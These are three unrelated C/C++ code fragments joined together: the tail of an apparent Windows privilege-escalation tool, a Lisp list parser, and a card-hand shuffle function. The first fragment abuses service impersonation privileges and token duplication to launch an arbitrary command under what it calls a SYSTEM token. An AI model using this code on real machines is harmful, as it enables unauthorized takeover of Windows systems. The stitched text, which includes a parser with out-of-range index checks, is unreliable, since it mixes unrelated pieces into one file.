	if (!DuplicateHandle(pi.hProcess, (HANDLE)4, GetCurrentProcess(), &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		TerminateProcess(pi.hProcess, 1);
		die("[x] can not duplicate thread handle");
	}
	TerminateProcess(pi.hProcess, 1);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	HANDLE hCurrentToken, hToken;
	DWORD d=0;
	PTOKEN_PRIVILEGES tp = (PTOKEN_PRIVILEGES)malloc(2048);
	_NtImpersonateThread* NtImpersonateThread=(_NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),"NtImpersonateThread");
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	SetThreadToken(&hThread, 0);
	NTSTATUS status = NtImpersonateThread(hThread, hThread, &sqos);
	if (status)
	{
		printf("[x] can not do self-impersonate : %x\n", status);
		return -1;
	}
	if (!OpenThreadToken(hThread, TOKEN_ALL_ACCESS, 0, &hToken))
	{
		die("[x] can not open token from SYSTEM thread");
	}
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hCurrentToken))
	{
		die("[x] can not open current process token");
	}
	if(!GetTokenInformation(hCurrentToken, TokenPrivileges, tp, 2048, &d))
	{
		die("[x] can not get current privileges");
	}
	for (int i = 0; i < tp->PrivilegeCount; i++)
	{
		tp->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
	}
	if (!AdjustTokenPrivileges(hCurrentToken, false, tp, d, NULL,NULL))
	{
		die("[x] adjust all privileges fail");
	}
	b = false;
	DWORD data[] = { 2, 1, 0, 0, 0 , 0, 0, 0 };
	PPRIVILEGE_SET pset = (PPRIVILEGE_SET)data;
	pset->Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValue(0, SE_ASSIGNPRIMARYTOKEN_NAME, &pset->Privilege[0].Luid);
	pset->Privilege[1].Attributes = SE_PRIVILEGE_ENABLED;
	LookupPrivilegeValue(0, SE_INCREASE_QUOTA_NAME, &pset->Privilege[1].Luid);

	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hRead, hWrite;
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = true;
	CreatePipe(&hRead, &hWrite, &sa, 1024);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	HANDLE hReadThread = CreateThread(NULL, 0, ThreadProc, hRead, 0, NULL);
	HANDLE hPrimary;
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, &hPrimary))
	{
		die("[x] can not duplicate token to primary");
	}
	if (PrivilegeCheck(hCurrentToken, pset, &b) && b)
	{
		printf("[+] %ws was assigned\n",SE_ASSIGNPRIMARYTOKEN_NAME);
		CreateProcessAsUser(hPrimary, 0, argv[1], 0, 0, true, 0, 0, 0, &si, &pi);
	}
	else
	{
		pset->PrivilegeCount = 1;
		LookupPrivilegeValue(0, SE_IMPERSONATE_NAME, &pset->Privilege[0].Luid);
		if (PrivilegeCheck(hCurrentToken, pset, &b) && b)
		{
			printf("[+] %ws was assigned\n", SE_IMPERSONATE_NAME);
			CreateProcessWithTokenW(hPrimary, 0, 0, argv[1], 0, 0, 0, &si, &pi);
		}
		else
		{
			printf("[x] no privileges assigned! this program can only use on SERVICE.");
			return -1;
		}
	}
	if (pi.dwProcessId)
	{
		printf("[!] process with pid: %d created.\n==============================\n", pi.dwProcessId);
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, -1);
		TerminateThread(hReadThread, 0);
		return -1;
	}
	else
	{
		die("[x] can not create process");
	}
	return 0;
}

#include "type.h"
#include <iostream>
#include <list>
#include <string>

// Split a string into a list of Flisp_Value. 
/* For example:
 * "(a b c)" -> [[a, b, c]]
 * "(a b (c d))" -> [[a, b, [c, d]]]
 */
Flisp_Value Flisp_List_Spliting(const std::string& s)
{
    std::list<Flisp_Value> l; // List to store the split values
    Flisp_Value v; // Variable to store the final result
    for (int i = 0; i < s.length(); i++) {
        if (s[i] == '(') { // If the current character is '(', start a new sublist
            int j = i;
            int count = 1; // Counter for matching parentheses
            while (count != 0) {
                if (j < s.length()) {
                    j++;
                    if (s[j] == '(') count++; // Increment counter for nested '('
                    if (s[j] == ')') count--; // Decrement counter for ')'
                }
            }
            // Recursively split the substring and add to the list
            l.push_back(Flisp_List_Spliting(s.substr(i + 1, j - i - 1)));
            i = j; // Move the index to the end of the processed substring
        }
        else if (s[i] == '"') {
            for (int j = i + 1; j < s.length(); j++) {
                if (s[j] == '\"') { // Find the closing quote
                    Flisp_Value subs;
                    subs.set_value(s.substr(i + 1, j - i - 1)); // Set the substring as a string value
                    l.push_back(subs); // Add to the list
                    i = j; // Move the index to the end of the processed string
                    break; // Exit the loop after finding the closing quote
                }
            }
        }
        else if (s[i] == ' ') {
            continue; // Skip spaces
        }
        else if (s[i] == ';') {
            // Skip comments
            while (s[i] != '\n' && i < s.length()) {
                i++; // Move to the end of the comment line
            }
        }
        else if (isdigit(s[i])) {
            std::string num_str;
            while (isdigit(s[i]) && i < s.length()) {
                i++; // Move to the end of the number
                num_str += s[i - 1]; // Append the digit to the number string
            }
            Flisp_Value subs;
            subs.set_value(std::stoi(num_str)); // Convert the number string to an integer and set it as a value
            l.push_back(subs); // Add the integer value to the list
            i--; // Adjust the index to point to the last processed character
        }
        else {
            int j = i;
            // Find the end of the current token
            while (s[j] != ' ' && s[j] != ')' && j < s.length()) {
                j++;
            }
            Flisp_Value subs;
            // Set the token as a name and add to the list
            subs.set_value_as_a_name(s.substr(i, j - i));
            l.push_back(subs);
            i = j - 1; // Move the index to the end of the processed token
        }
    }
    v.set_value(l); // Set the list as the value of the result
    return v; // Return the result
} // The codes andcomments are offered Supported by standard GitHub tools.

#include "CardHand.h"

card_hand_action_result_t CardHand::shuffleHand(uint32_t seed) {
  if (this->getHandSize() == 0) {
    return CARD_ACTION_RESULT_HAND_EMPTY;
  }

  // Fisher-Yates/Knuth shuffle algorithm
  // From GitHub Copilot lol
  auto rng = cardhand_shuffle_rng_t(seed);

  for (card_hand_index_t i = this->getHandSize() - 1; i > 0; i--) {
    std::uniform_int_distribution<card_hand_index_t> dist(0, i);
    card_hand_index_t randomIndex = dist(rng);
    std::swap(this->hand[i], this->hand[randomIndex]);
  }

  return CARD_ACTION_RESULT_SUCCESS;
}

